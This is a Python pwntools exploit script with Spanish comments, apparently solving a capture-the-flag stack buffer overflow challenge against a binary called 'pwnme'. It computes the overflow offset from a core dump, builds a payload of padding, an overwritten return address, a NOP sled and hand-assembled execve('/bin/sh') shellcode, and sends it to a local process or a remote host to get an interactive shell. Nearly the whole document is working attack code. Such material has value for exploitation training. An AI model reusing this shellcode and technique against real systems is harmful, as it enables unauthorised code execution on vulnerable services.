from pwn import *
import os

HOST = "pwn.digitalocean.com"
PORT = 10001
BIN = "./pwnme"

# Configuramos el contexto de ejecucion
context.update(arch='amd64', os='linux')

######################################
# Obtenemos el padding del BOF
######################################

log.info("Obteniendo padding...")


elf = ELF(BIN, checksec=False)

p = process(BIN)
p.sendline(cyclic(200, n=8)) # Enviamos una cadena conocida para controlar la direccion del segfault
p.wait()

core = p.corefile

PADDING = int(str(cyclic_find(core.read(core.rsp, 8), n=8))) # Obtenemos el OFFSET

log.info("Padding: " + str(PADDING))

PADDING = 'A' * PADDING

os.system("rm ./core.*")

######################################
# Explotamos
######################################

local = input("Run local? (y/n): ").strip()

if local == 'y':

    debug = input("Debug? (y/n)").strip()
    if debug == 'y':
        print("GDB will open...")
        p = gdb.debug(BIN)

    else:
        p = process(BIN)

else:
    p = remote(HOST, PORT)


# ASLR desactivado. Sabemos la direccion de buff[]
# Podemos usar un debugger para verlo.
buff = 0x7fffffffdff0 # Buff leakeado

# Hay una diferencia entre las direcciones de la pila en GDB y fuera de GDB, porque
# el SO carga variables de entorno ANTES del comienzo de la pila
# Normalmente GDB se va a quedar corto, al cargar esas variables de entorno (recordar que la pila "decrece")
# Entonces querremos fallar buff por arriba, para caer en el colchon de nops
# buff = 0x7fffffffe020 -> posicion de buff al correr el binario


print(p.recv().decode())

# shellcode = asm(shellcraft.sh()) # Obtenemos shellcode para llamar a execve
# print (shellcode.hex())

# Orden de parametros a syscall
'''
1. rdi
2. rsi
3. rdx
'''

# execve("/bin/sh", 0, 0)
'''
XOR		rax, rax					--> rax = 0
XOR 	rdx, rdx					--> rdx = 0
PUSH 	rdx							--> Caracter de fin de cadena
XOR		rsi, rsi					--> rsi = 0
MOVABS 	rbx, 0x68732f2f6e69622f     --> rbx = "/bin/sh"
PUSH 	rbx							--> Metemos la cadena en pila
PUSH 	rsp							--> *rsp = "/bin/sh\0"
POP 	rdi							--> rdi es un puntero a "/bin/sh"	
MOV 	al, 0x3b					--> Cargamos syscall 0x3b (execve)
syscall								--> execve($rdi, $rsi, $rdx)
'''
shellcode = b"\x48\x31\xC0\x48\x31\xD2\x52\x48\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xB0\x3B\x0F\x05"

# Movemos el offset de salto para que caiga en nuestro colchon de nops, evitando el PADDING
# PADDING + 8 (direccion de salto) + distancia de seguridad
buff += len(PADDING) + 8 + 16

# Podemos cargar la shellcode despues del buffer
payload =  PADDING.encode() + p64(buff) + asm(shellcraft.nop())*100 + shellcode.ljust(200) + asm(shellcraft.nop())

p.sendline(payload)

p.interactive() # Ya tenemos shell


